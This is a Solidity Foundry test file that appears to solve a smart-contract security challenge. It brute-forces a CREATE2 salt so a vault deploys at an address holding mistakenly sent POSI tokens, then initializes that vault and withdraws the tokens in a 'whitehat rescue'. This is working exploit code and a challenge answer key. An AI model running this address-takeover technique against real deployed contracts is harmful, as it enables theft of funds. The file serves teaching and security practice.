// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {VaultFactory} from "../src/4_RescuePosi/myVaultFactory.sol";
import {VaultWalletTemplate} from "../src/4_RescuePosi/myVaultWalletTemplate.sol";
import {PosiCoin} from "../src/4_RescuePosi/PosiCoin.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract SaltFinder {
    function findSalt(
        address deployer,
        address contractAddress,
        bytes memory bytecode
    ) public pure returns (uint256) {
        for (uint256 salt = 0; salt < 200000; salt++) {
            if (predictAddress(deployer, salt, bytecode) == contractAddress) {
                return salt;
            }
        }

        revert("Salt not found");
    }

    function predictAddress(
        address deployer,
        uint256 salt,
        bytes memory initCode
    ) public pure returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), deployer, salt, keccak256(initCode))
        );

        // Get the last 20 bytes of the hash
        return address(uint160(uint256(hash)));
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge4Test is Test {
    VaultFactory public FACTORY;
    PosiCoin public POSI;

    SaltFinder public saltFinder;
    address public unclaimedAddress =
        0x70E194050d9c9c949b3061CC7cF89dF9c6782b7F;

    address public whitehat = makeAddr("whitehat");
    address public devs = makeAddr("devs");

    function setUp() public {
        vm.label(unclaimedAddress, "Unclaimed Address");

        // Instantiate the Factory
        FACTORY = new VaultFactory();

        // Instantiate the POSICoin
        POSI = new PosiCoin();

        // OOPS transferred to the wrong address!
        POSI.transfer(unclaimedAddress, 1000 ether);
    }

    function testWhitehatRescue() public {
        vm.deal(whitehat, 10 ether);
        vm.startPrank(whitehat, whitehat);

        address deployer = 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f;

        // Initialize the SaltFinder contract
        saltFinder = new SaltFinder();

        // Get bytecode of the VaultWalletTemplate contract
        bytes memory bytecode = abi.encodePacked(
            type(VaultWalletTemplate).creationCode
        );

        // Get salt from brute force
        uint256 salt = saltFinder.findSalt(
            deployer,
            unclaimedAddress,
            bytecode
        );

        address vault = FACTORY.deploy(bytecode, salt);

        bytes4 selector = bytes4(keccak256(bytes("initialize(address)")));

        FACTORY.callWallet(
            address(vault),
            abi.encodeWithSelector(selector, whitehat)
        );

        VaultWalletTemplate vaultInstance = VaultWalletTemplate(payable(vault));

        vaultInstance.withdrawERC20(address(POSI), 1000 ether, devs);
        vm.stopPrank();

        assertEq(
            POSI.balanceOf(devs),
            1000 ether,
            "devs' POSI balance should be 1000 POSI"
        );
    }
}
